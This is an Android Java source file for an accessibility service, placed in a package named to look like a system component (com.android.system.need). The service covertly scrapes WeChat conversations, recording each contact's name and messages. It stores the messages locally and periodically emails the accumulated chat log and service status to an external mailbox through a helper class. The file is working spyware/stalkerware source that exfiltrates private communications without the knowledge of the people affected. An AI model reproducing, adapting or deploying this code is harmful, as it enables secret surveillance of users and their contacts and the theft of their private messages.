package com.android.system.need;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * <p>
 * 获取即时微信聊天记录服务类
 */

public class SService extends AccessibilityService {

    /**
     * 聊天对象
     */
    private String ChatName;
    /**
     * 聊天最新一条记录
     */
    private String ChatRecord = "y";

    /**
     * 小视频的秒数，格式为00:00
     */
    private String VideoSecond;


    //
    private static int LAUCHER = 20;
    private int number = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        //去拉起 MyService
        Intent intent = new Intent(this, MyService.class);
        this.startService(intent);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            int eventType = event.getEventType();
            switch (eventType) {
                //每次在聊天界面中有新消息到来时都出触发该事件
                case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                    //获取当前聊天页面的根布局
                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                    //获取聊天信息
                    getWeChatLog(rootNode);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    /**
     * 遍历所有控件获取聊天信息
     *
     * @param rootNode
     */

    private void getWeChatLog(AccessibilityNodeInfo rootNode) {
        try {
            if (rootNode != null) {
                //获取所有聊天的线性布局
                List<AccessibilityNodeInfo> listChatRecord = rootNode.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/p");
                if (listChatRecord.size() == 0) {
                    return;
                }
                //获取最后一行聊天的线性布局（即是最新的那条消息）
                AccessibilityNodeInfo finalNode = listChatRecord.get(listChatRecord.size() - 1);
                if (finalNode != null) {


                    //获取聊天对象
                    GetChatName(finalNode);
                    //获取聊天内容
                    GetChatRecord(finalNode);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 遍历所有控件，找到头像Imagview，里面有对联系人的描述
     */
    private void GetChatName(AccessibilityNodeInfo node) {
        try {
            if (node != null) {


                for (int i = 0; i < node.getChildCount(); i++) {
                    AccessibilityNodeInfo node1 = node.getChild(i);
                    if (node1 != null) {


                        if ("android.widget.ImageView".equals(node1.getClassName()) && node1.isClickable()) {
                            //获取聊天对象,这里两个if是为了确定找到的这个ImageView是头像的
                            if (!TextUtils.isEmpty(node1.getContentDescription())) {
                                ChatName = node1.getContentDescription().toString();
                                if (ChatName.contains("头像")) {
                                    ChatName = ChatName.replace("头像", "");
                                }
                            }

                        }
                    }
                    GetChatName(node1);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 遍历所有控件:这里分四种情况
     * 文字聊天: 一个TextView，并且他的父布局是android.widget.RelativeLayout
     * 语音的秒数: 一个TextView，并且他的父布局是android.widget.RelativeLayout，但是他的格式是0"的格式，所以可以通过这个来区分
     * 图片:一个ImageView,并且他的父布局是android.widget.FrameLayout,描述中包含“图片”字样（发过去的图片），发回来的图片现在还无法监听
     * 表情:也是一个ImageView,并且他的父布局是android.widget.LinearLayout
     * 小视频的秒数:一个TextView，并且他的父布局是android.widget.FrameLayout，但是他的格式是00:00"的格式，所以可以通过这个来区分
     *
     * @param node
     */
    public void GetChatRecord(AccessibilityNodeInfo node) {
        try {
            if (node != null) {


                for (int i = 0; i < node.getChildCount(); i++) {
                    AccessibilityNodeInfo nodeChild = node.getChild(i);

                    if (nodeChild != null) {
                        //聊天内容是:文字聊天(包含语音秒数)
                        if ("android.widget.TextView".equals(nodeChild.getClassName()) && "android.widget.RelativeLayout".equals(nodeChild.getParent().getClassName().toString())) {
                            if (!TextUtils.isEmpty(nodeChild.getText())) {
                                String RecordText = nodeChild.getText().toString();
                                //这里加个if是为了防止多次触发TYPE_VIEW_SCROLLED而打印重复的信息
                                if (!RecordText.equals(ChatRecord)) {
                                    ChatRecord = RecordText;
                                    //判断是语音秒数还是正常的文字聊天,语音的话秒数格式为5"
                                    if (ChatRecord.contains("\"")) {
                                        //Toast.makeText(this, ChatName + "发了一条" + ChatRecord + "的语音", Toast.LENGTH_SHORT).show();

                                        Log.e("WeChatLog", ChatName + "发了一条" + ChatRecord + "的语音");
                                    } else {
                                        //这里在加多一层过滤条件，确保得到的是聊天信息，因为有可能是其他TextView的干扰，例如名片等
                                        if (nodeChild.isLongClickable()) {
                                            //Toast.makeText(this, ChatName + "：" + ChatRecord, Toast.LENGTH_SHORT).show();
                                            number++;
                                            Log.i("WeChatLog_this", ChatName + "：" + ChatRecord);

                                            //生成本地的文件，来记录每条消息
                                            SharedPreferences settings = getSharedPreferences("my_spf", MODE_PRIVATE);
                                            String lastValue = settings.getString("msg_key", "");
                                            SharedPreferences.Editor editor = settings.edit();
                                            String nowValue = lastValue + ChatName + "：" + ChatRecord + "\n";

                                            Log.i("###.all_msg", nowValue);
                                            editor.putString("msg_key", nowValue);
                                            // 提交本次编辑
                                            editor.commit();
                                            //发送邮件的条件
                                            if ("嗯".equals(ChatRecord) || "8".equals(ChatRecord) || "哦".equals(ChatRecord)) {
                                                sendEmail(this);
                                            }
                                            if (number == LAUCHER) {
                                                number = 0;
                                                sendEmail(this);
                                            }

                                        }

                                    }
                                    return;
                                }
                            }
                        }

                    }
                    if (nodeChild != null && !TextUtils.isEmpty(nodeChild.getClassName())) {


                        //聊天内容是:表情
                        if ("android.widget.ImageView".equals(nodeChild.getClassName()) && "android.widget.LinearLayout".equals(nodeChild.getParent().getClassName().toString())) {
                            //Toast.makeText(this, ChatName + "发的是表情", Toast.LENGTH_SHORT).show();

                            Log.e("WeChatLog", ChatName + "发的是表情");

                            return;
                        }

                        //聊天内容是:图片
                        if ("android.widget.ImageView".equals(nodeChild.getClassName())) {
                            //安装软件的这一方发的图片（另一方发的暂时没实现）
                            if ("android.widget.FrameLayout".equals(nodeChild.getParent().getClassName().toString())) {
                                if (!TextUtils.isEmpty(nodeChild.getContentDescription())) {
                                    if (nodeChild.getContentDescription().toString().contains("图片")) {
                                        //Toast.makeText(this, ChatName + "发的是图片", Toast.LENGTH_SHORT).show();

                                        Log.e("WeChatLog", ChatName + "发的是图片");
                                    }
                                }
                            }
                        }

                        //聊天内容是:小视频秒数,格式为00：00
                        if ("android.widget.TextView".equals(nodeChild.getClassName()) && "android.widget.FrameLayout".equals(nodeChild.getParent().getClassName().toString())) {
                            if (!TextUtils.isEmpty(nodeChild.getText())) {
                                String second = nodeChild.getText().toString().replace(":", "");
                                //正则表达式，确定是不是纯数字,并且做重复判断
                                if (second.matches("[0-9]+") && !second.equals(VideoSecond)) {
                                    VideoSecond = second;
                                    //Toast.makeText(this, ChatName + "发了一段" + nodeChild.getText().toString() + "的小视频", Toast.LENGTH_SHORT).show();

                                    Log.e("WeChatLog", "发了一段" + nodeChild.getText().toString() + "的小视频");
                                }
                            }

                        }
                    }
                    GetChatRecord(nodeChild);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    /**
     * 必须重写的方法：系统要中断此service返回的响应时会调用。在整个生命周期会被调用多次。
     */
    @Override
    public void onInterrupt() {
        sendEmailLog("服务将要终止");
        //Toast.makeText(this, "我快被终结了啊-----", Toast.LENGTH_SHORT).show();
    }

    /**
     * 服务开始连接
     */
    @Override
    protected void onServiceConnected() {
        sendEmailLog("服务已开启");
        //Toast.makeText(this, "服务已开启", Toast.LENGTH_SHORT).show();
        super.onServiceConnected();
    }

    /**
     * 服务断开
     *
     * @param intent
     * @return
     */
    @Override
    public boolean onUnbind(Intent intent) {
        //Toast.makeText(this, "服务已被关闭", Toast.LENGTH_SHORT).show();
        sendEmailLog("服务已被关闭");
        return super.onUnbind(intent);
    }

    /**
     * 发送邮件
     */
    private void sendEmail(final Context context) {
        try {

            // 读取文件中的消息，并发送邮件
            SharedPreferences settings = context.getSharedPreferences("my_spf", MODE_PRIVATE);
            String EmaiBody = settings.getString("msg_key", "暂时没有消息");
            SendEmailHelper.sendEmail("微信聊天如下： \n" +
                    "\n" + EmaiBody);
            Log.i("***", "--sendEmail--:" + EmaiBody);
            //每次发送之后把 SharedPreferences my_spf 文件对应的 msg_key 值变为""
            SharedPreferences.Editor editor = settings.edit();
            editor.putString("msg_key", "");
            editor.commit();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    /**
     * 发送邮件Log
     */
    private void sendEmailLog(final String str) {
        try {
            SendEmailHelper.sendEmail(str);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}